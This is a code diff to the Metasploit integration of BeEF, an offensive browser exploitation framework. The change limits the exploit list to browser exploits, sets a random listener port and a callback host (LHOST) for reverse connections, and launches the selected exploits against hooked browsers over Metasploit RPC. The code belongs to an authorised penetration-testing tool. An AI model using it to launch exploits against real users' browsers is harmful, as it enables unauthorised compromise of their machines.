@@ -48,6 +48,7 @@ module API
                 msf_modules = msf.call('module.exploits')
                 count = 1
                 msf_modules['modules'].each{|m|
+                    next if not m.include? "/browser/"
                     m_details = msf.call('module.info', 'exploits', m)
                     if m_details
                         key = 'msf_'+m.split('/').last
@@ -108,10 +109,20 @@ module API
     def self.override_execute(mod, opts)
         msf = BeEF::Extension::Metasploit::RpcClient.instance
         msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")
+	msf_opts = {}
+
+	opts.each { |opt|
+		next if ['e','ie_session','and_module_id'].include? opt['name']
+		msf_opts[opt["name"]] = opt["value"]
+	}
+	msf_opts["LPORT"] = rand(50000) + 1024
+	msf_opts['LHOST']  =  BeEF::Core::Configuration.instance.get('beef.extension.metasploit.callback_host') 
+
+
         if msf_key != nil and msf.login
             # Are the options correctly formatted for msf?
             # This call has not been tested
-            msf.call('module.execute', 'exploit', msf_key, opts)
+            msf.call('module.execute', 'exploit', msf_key, msf_opts)
         end
         # Still need to create command object to store a string saying "Exploit launched @ [time]", to ensure BeEF can keep track of
         # which exploits where executed against which hooked browsers
